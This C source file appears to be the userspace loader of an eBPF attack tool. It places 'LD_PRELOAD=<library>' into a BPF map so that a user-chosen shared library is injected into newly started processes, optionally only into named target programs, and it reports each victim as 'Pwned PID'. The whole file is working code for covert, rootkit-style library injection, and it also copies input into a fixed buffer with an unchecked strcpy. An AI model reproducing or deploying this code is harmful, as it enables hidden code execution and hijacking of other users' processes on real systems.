#include "asunto.h"
#include <unistd.h>
#include <signal.h>
#include <sys/resource.h>
#include <time.h>
#include <errno.h>
#include <linux/bpf.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <stdio.h>
#include <string.h>


#define check_fail_handle_goto(cond, err_stmt, label, fmt, ...) ({ \
	if (cond) {                                                \
		fprintf(stderr, fmt "\n", ## __VA_ARGS__);         \
		err_stmt;                                          \
		goto label;                                        \
	}                                                          \
})

#define check_fail_goto(cond, label, fmt, ...) ({            \
	if (cond) {                                          \
		fprintf(stderr, fmt "\n", ## __VA_ARGS__);   \
		goto label;                                  \
	}                                                    \
})

#define check_fail_exit(cond, fmt, ...) ({                   \
	if (cond) {                                          \
		fprintf(stderr, fmt "\n", ## __VA_ARGS__);   \
		exit(1);                                     \
	}                                                    \
})


#define GET_MACRO(_1,_2,_3,_4,NAME,...) NAME
#define check_fail(...) GET_MACRO(__VA_ARGS__,            \
				  check_fail_handle_goto, \
				  check_fail_goto,        \
				  check_fail_exit)(__VA_ARGS__)

struct exec_evt {
    pid_t pid;
    pid_t tgid;
    char comm[32];
    char file[32];
};

static int handle_evt(void *ctx, void *data, size_t sz)
{
    const struct exec_evt *evt = data;

    fprintf(stdout, "Pwned PID <> pid: %d -- comm: %s\n", evt->pid, evt->file);

    return 0;
}

int libbpf_print_fn(enum libbpf_print_level level,
		    const char *format, va_list args)
{
	/* Ignore debug-level libbpf logs */
	if (level > LIBBPF_INFO)
		return 0;
	return vfprintf(stderr, format, args);
}

void bump_memlock_rlimit(void)
{
	struct rlimit rlim_new = {
		.rlim_cur	= RLIM_INFINITY,
		.rlim_max	= RLIM_INFINITY,
	};

	check_fail(setrlimit(RLIMIT_MEMLOCK, &rlim_new),
		   "Failed to increase RLIMIT_MEMLOCK limit!");
}

static volatile bool exiting = false;

static void sig_handler(int sig)
{
	exiting = true;
}


int main(int argc, char *argv[])
{
	
	if (argc < 2) {
        printf("Uso: %s <lib>\n", argv[0]);
        return 1;
    }
	
	int err = 0;
	struct ld_so_ebpf *obj;

	libbpf_set_print(libbpf_print_fn);

	/* Bump RLIMIT_MEMLOCK to create BPF maps */
	bump_memlock_rlimit();

	/* Clean handling of Ctrl-C */
	signal(SIGINT, sig_handler);
	signal(SIGTERM, sig_handler);

	obj = ld_so_ebpf__open_and_load();
	check_fail(!obj, "Failed to load bpf");

	int map_fd;
	pid_t key;
	key = 0;
	
	char value[70] = "LD_PRELOAD="; 
	
    strncat(value, argv[1], sizeof(value) - strlen(value) - 1);

   
    printf("%s\n", value); 
	
	map_fd = bpf_object__find_map_fd_by_name(obj->obj, "start");

	
	bpf_map_update_elem(map_fd, &key, &value, BPF_ANY);
	
	if (argc > 2) {
		
		int yes = 1;
		int map_action;
		
		map_action = bpf_object__find_map_fd_by_name(obj->obj, "action");
	
		bpf_map_update_elem(map_action, &key, &yes, BPF_ANY);
		
		int map_prog;
		map_prog = bpf_object__find_map_fd_by_name(obj->obj, "progs");

		int index = 0 ;
		
		char *input = argv[2];
		char *token = strtok(input, ",");
		char buffer[120];
		while (token != NULL) {
			
			 strcpy(buffer, token);
			
			bpf_map_update_elem(map_prog, &index, &buffer, BPF_ANY);
			index++;
			token = strtok(NULL, ",");
		}
	}
	
	err = ld_so_ebpf__attach(obj);
	check_fail(err, cleanup, "Failed attach to BPF program");	
	
	struct ring_buffer *rb = ring_buffer__new(bpf_map__fd(obj->maps.rb), handle_evt, NULL, NULL);

    while (!exiting) {
        ring_buffer__poll(rb, 1000);
    }

	ld_so_ebpf__detach(obj);

cleanup:
	
	ld_so_ebpf__destroy(obj);

	return err < 0 ? -err : 0;
}
